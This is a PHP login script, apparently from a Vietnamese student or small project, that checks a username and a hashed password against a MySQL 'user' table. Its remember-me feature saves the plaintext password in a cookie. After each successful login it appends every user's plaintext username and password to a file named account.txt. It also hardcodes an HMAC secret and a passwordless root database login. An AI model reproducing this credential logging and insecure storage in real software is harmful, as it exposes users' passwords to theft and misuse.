<?php
session_start();

// Lấy dữ liệu từ form
$username = "";
if (isset($_POST['username'])) {
    $username = trim($_POST['username']);
}

$password = "";
if (isset($_POST['password'])) {
    $password = trim($_POST['password']);
}

$remember = false;
if (isset($_POST['remember'])) {
    $remember = true; // checkbox "Remember me"
}

// Lưu cookie nếu người dùng chọn "Remember me"
if ($remember) {
    setcookie('saved_user', $username, time() + (30 * 24 * 60 * 60), "/"); // lưu 30 ngày
    setcookie('saved_pass', $password, time() + (30 * 24 * 60 * 60), "/");
}

// Kiểm tra cookie khi load trang
if (isset($_COOKIE['saved_user']) && isset($_COOKIE['saved_pass'])) {
    $username = $_COOKIE['saved_user'];
    $password = $_COOKIE['saved_pass'];
}

// Kết nối CSDL
$servername = "localhost";
$username_db = "root";
$password_db = "";
$dbname = "cnwat";

$conn = new mysqli($servername, $username_db, $password_db, $dbname);

if ($conn->connect_error) {
    die("Kết nối thất bại: " . $conn->connect_error);
}

$sql = "SELECT * FROM user WHERE username = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $user = $result->fetch_assoc();

    // So sánh mật khẩu
    if (password_verify($password, $user['password'])) {
        $_SESSION['username'] = $user['username'];
        $_SESSION['status'] = 'login'; // lưu trạng thái xác thực
        $key = "youngnvk18022004";
        $encoded_user = hash_hmac('sha256', $user['username'], $key);
        setcookie('cookie', $encoded_user, time() + 7 * 24 * 60 * 60, "/", "", false, true);
        setcookie('login_status', 'login', time() + 7 * 24 * 60 * 60, "/", "", false, true);     

        // Lưu thông tin vào file account.txt
        $file = fopen("account.txt", "a");
        fwrite($file, "Username: $username | Password: $password" . PHP_EOL);
        fclose($file);

        echo '<div class="alert-wrapper">
            <div class="alert-success">
                <div>
                    <div class="title">Đăng nhập thành công!</div>
                    <div class="success-actions">
                        <a href="index.php?page=welcome" class="btn-primary">Vào hệ thống</a>
                    </div>
                </div>
            </div>
          </div>';
    } else {
        echo '<div class="alert-wrapper">
            <div class="alert-error">
                <div>
                    <div class="title">Sai mật khẩu!</div>
                    <div class="success-actions">
                        <a href="index.php?page=login" class="btn-primary">Thử lại</a>
                    </div>
                </div>
            </div>
          </div>';
    }
} else {
    echo '<div class="alert-wrapper">
        <div class="alert-error">
            <div>
                <div class="title">Tài khoản không tồn tại!</div>
                <div class="success-actions">
                    <a href="index.php?page=signup.php" class="btn-primary">Đăng ký ngay</a>
                </div>
            </div>
        </div>
      </div>';
}

$stmt->close();
$conn->close();
?>
